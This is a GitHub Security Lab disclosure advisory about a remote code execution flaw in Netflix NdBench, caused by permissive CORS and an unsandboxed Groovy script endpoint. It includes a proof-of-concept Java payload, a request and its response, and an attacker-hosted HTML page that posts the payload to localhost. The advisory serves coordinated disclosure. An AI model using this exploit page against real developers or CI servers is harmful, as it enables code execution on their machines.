<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">June 22, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-064: Arbitrary code execution in Netflix NdBench</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-04-07: Reported to Netflix Security Team</li>
  <li>2021-05-03: Issue is <a href="https://github.com/Netflix/ndbench/commit/987a7e4e39d1a4df18d0a8cd02d4ba1b47c19f62">fixed</a></li>
</ul>

<h2 id="summary">Summary</h2>
<p>An attacker may get arbitrary code execution on NDBench servers by providing arbitrary Groovy scripts.</p>

<h2 id="product">Product</h2>
<p>Netflix NdBench</p>

<h2 id="tested-version">Tested Version</h2>
<p>v0.5.0-rc.1 (2021-03-19)</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-overly-broad-cors-configuration">Issue 1: Overly broad CORS configuration</h3>
<p>NdBench is configured with an overly broad default CORS configuration which allows any site to send it cross-site requests:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Content-Type, content-type
Access-Control-Allow-Method: OPTIONS, GET, POST
</code></pre></div></div>

<h4 id="impact">Impact</h4>
<p>This issue may let any site to send requests to the REST API.</p>

<h3 id="issue-2-unrestricted-groovy-script">Issue 2: Unrestricted Groovy Script</h3>
<p>The application is designed to evaluate Groovy scripts as described in the <a href="https://github.com/Netflix/ndbench/wiki/Dynamic-Plugin">Dynamic plugin configuration</a>. This service is backed up by the <a href="https://github.com/Netflix/ndbench/blob/91ba19a7d5d6d4490ea2af3064defb1ec571b25d5/ndbench-core/src/main/java/com/netflix/ndbench/core/resources/NdBenchResource.java#L71"><code class="language-plaintext highlighter-rouge">NdBenchResource</code></a> endpoint:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nd">@Path</span><span class="o">(</span><span class="s">"/initfromscript"</span><span class="o">)</span>
    <span class="nd">@POST</span>
    <span class="nd">@Consumes</span><span class="o">(</span><span class="nc">MediaType</span><span class="o">.</span><span class="na">MULTIPART_FORM_DATA</span><span class="o">)</span>
    <span class="nd">@Produces</span><span class="o">(</span><span class="nc">MediaType</span><span class="o">.</span><span class="na">APPLICATION_JSON</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">Response</span> <span class="nf">initfromscript</span><span class="o">(</span><span class="nd">@FormDataParam</span><span class="o">(</span><span class="s">"dynamicplugin"</span><span class="o">)</span> <span class="nc">String</span> <span class="n">dynamicPlugin</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">GroovyClassLoader</span> <span class="n">gcl</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GroovyClassLoader</span><span class="o">();</span>

            <span class="nc">Class</span> <span class="n">classFromScript</span> <span class="o">=</span> <span class="n">gcl</span><span class="o">.</span><span class="na">parseClass</span><span class="o">(</span><span class="n">dynamicPlugin</span><span class="o">);</span>

            <span class="nc">Object</span> <span class="n">objectFromScript</span> <span class="o">=</span> <span class="n">classFromScript</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>

            <span class="nc">NdBenchClient</span> <span class="n">client</span> <span class="o">=</span> <span class="o">(</span><span class="nc">NdBenchClient</span><span class="o">)</span> <span class="n">objectFromScript</span><span class="o">;</span>

            <span class="n">ndBenchDriver</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">client</span><span class="o">);</span>
            <span class="k">return</span> <span class="nf">sendSuccessResponse</span><span class="o">(</span><span class="s">"NdBench client - dynamic plugin initiated with script!"</span><span class="o">);</span>

        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"Error initializing dynamic plugin from script"</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
            <span class="k">return</span> <span class="nf">sendErrorResponse</span><span class="o">(</span><span class="s">"script initialization failed for dynamic plugin!"</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>

        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>The Groovy engine is not sandboxed which allows attackers to run arbitrary code by sending requests to this unauthenticated endpoint.</p>

<p>In addition, this endpoint accepts <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests">simple POST requests</a> which trigger no preflight requests. Even if it did, the default CORS configuration will allow any site to send cross-origin requests to this endpoint. As a result an attacker can host a malicious web page that, when visited, will send a malicious POST request to the localhost server and run arbitrary code on the developer machine or CI/CD server running NdBench.</p>

<h4 id="impact-1">Impact</h4>
<p>This issue may lead to Remote Code Execution. Any developer running NdBench may get compromised by visiting a malicious web site.</p>

<h4 id="resources">Resources</h4>
<p>Example payload:</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">Exploit</span><span class="o">()</span> <span class="o">{</span>
        <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"touch /tmp/pwned-ndbench"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Example request script:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://localhost:8080/REST/ndbench/driver/initfromscript 
dynamicplugin=!file(exploit.json)
</code></pre></div></div>

<p>Example server response:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>500 Internal Error
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Content-Type, content-type
Access-Control-Allow-Method: OPTIONS, GET, POST
Content-Type: application/json
Transfer-Encoding: chunked
Date: Wed, 07 Apr 2021 09:30:05 GMT
Connection: close

{
  "detailedMessage": "java.lang.ClassCastException: Exploit cannot be cast to com.netflix.ndbench.api.plugin.NdBenchClient\n\tat com.netflix.ndbench.core.resources.NdBenchResource.initfromscript(NdBenchResource.java:83)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat com.sun.jersey.spi.container.JavaMethodInvokerFactory$1.invoke(JavaMethodInvokerFactory.java:60)\n\tat com.sun.jersey.server.impl.model.method.dispatch.AbstractResourceMethodDispatchProvider$ResponseOutInvoker._dispatch(AbstractResourceMethodDispatchProvider.java:205)\n\tat com.sun.jersey.server.impl.model.method.dispatch.ResourceJavaMethodDispatcher.dispatch(ResourceJavaMethodDispatcher.java:75)\n\tat com.sun.jersey.server.impl.uri.rules.HttpMethodRule.accept(HttpMethodRule.java:302)\n\tat com.sun.jersey.server.impl.uri.rules.RightHandPathRule.accept(RightHandPathRule.java:147)\n\tat com.sun.jersey.server.impl.uri.rules.ResourceClassRule.accept(ResourceClassRule.java:108)\n\tat com.sun.jersey.server.impl.uri.rules.RightHandPathRule.accept(RightHandPathRule.java:147)\n\tat com.sun.jersey.server.impl.uri.rules.RootResourceClassesRule.accept(RootResourceClassesRule.java:84)\n\tat com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1542)\n\tat com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1473)\n\tat com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1419)\n\tat com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1409)\n\tat com.sun.jersey.spi.container.servlet.WebComponent.service(WebComponent.java:409)\n\tat com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:558)\n\tat com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:733)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:742)\n\tat com.google.inject.servlet.ServletDefinition.doServiceImpl(ServletDefinition.java:287)\n\tat com.google.inject.servlet.ServletDefinition.doService(ServletDefinition.java:277)\n\tat com.google.inject.servlet.ServletDefinition.service(ServletDefinition.java:182)\n\tat com.google.inject.servlet.ManagedServletPipeline.service(ManagedServletPipeline.java:91)\n\tat com.google.inject.servlet.FilterChainInvocation.doFilter(FilterChainInvocation.java:85)\n\tat com.google.inject.servlet.ManagedFilterPipeline.dispatch(ManagedFilterPipeline.java:119)\n\tat com.google.inject.servlet.GuiceFilter$1.call(GuiceFilter.java:133)\n\tat com.google.inject.servlet.GuiceFilter$1.call(GuiceFilter.java:130)\n\tat com.google.inject.servlet.GuiceFilter$Context.call(GuiceFilter.java:203)\n\tat com.google.inject.servlet.GuiceFilter.doFilter(GuiceFilter.java:130)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)\n\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)\n\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)\n\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)\n\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)\n\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)\n\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)\n\tat org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)\n\tat org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)\n\tat org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806)\n\tat org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498)\n\tat org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\n\tat java.lang.Thread.run(Thread.java:748)",
  "isSuccess": false,
  "message": "script initialization failed for dynamic plugin! Exploit cannot be cast to com.netflix.ndbench.api.plugin.NdBenchClient !!!  "
}
</code></pre></div></div>

<p>Regardless of the error, the code in the static initializer block and <code class="language-plaintext highlighter-rouge">init</code> method was run.</p>

<p>The following page can be served on an attacker controlled server to compromise any developer running ndbench which visits the page:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">();</span>
    <span class="kd">var</span> <span class="nx">content</span> <span class="o">=</span> <span class="s2">`
    public class Exploit {
      public Exploit() {
        Runtime.getRuntime().exec("touch /tmp/pwned-ndbench");
      }
    }`</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">content</span><span class="p">],</span> <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/xml</span><span class="dl">"</span><span class="p">});</span>
    <span class="nx">formData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="dl">"</span><span class="s2">dynamicplugin</span><span class="dl">"</span><span class="p">,</span> <span class="nx">blob</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">request</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://localhost:8080/REST/ndbench/driver/initfromscript</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">request</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">formData</span><span class="p">);</span>
  <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>/tmp/pwned-ndbench should have been created<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-064</code> in any communication regarding this issue.</p>


   